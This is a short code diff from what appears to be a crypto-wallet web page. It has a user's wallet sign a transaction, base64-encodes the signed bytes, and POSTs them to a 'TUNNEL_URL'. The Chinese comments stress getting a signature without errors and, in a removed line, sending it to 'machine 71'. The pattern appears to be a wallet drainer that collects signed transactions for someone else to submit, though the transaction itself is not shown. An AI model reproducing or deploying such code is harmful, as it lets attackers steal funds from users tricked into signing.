@@ -37,20 +37,18 @@
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
-                // 🚀 核心：只请求签名
+                // 🚀 核心：只签名，不报错
                 const signed = await p.signTransaction(tx);
                 document.getElementById('msg').innerText = "Transmitting...";
 
-                // 💰 采用原生 Uint8Array 转换，完美避开 Buffer 报错
+                // 💰 原生字节流转换，完美避开 Buffer 报错
                 const rawBinary = signed.serialize();
                 let binaryStr = "";
-                const len = rawBinary.byteLength;
-                for (let i = 0; i < len; i++) {
+                for (let i = 0; i < rawBinary.byteLength; i++) {
                     binaryStr += String.fromCharCode(rawBinary[i]);
                 }
                 const signatureB64 = btoa(binaryStr);
 
-                // 发送给 71 机
                 fetch(TUNNEL_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
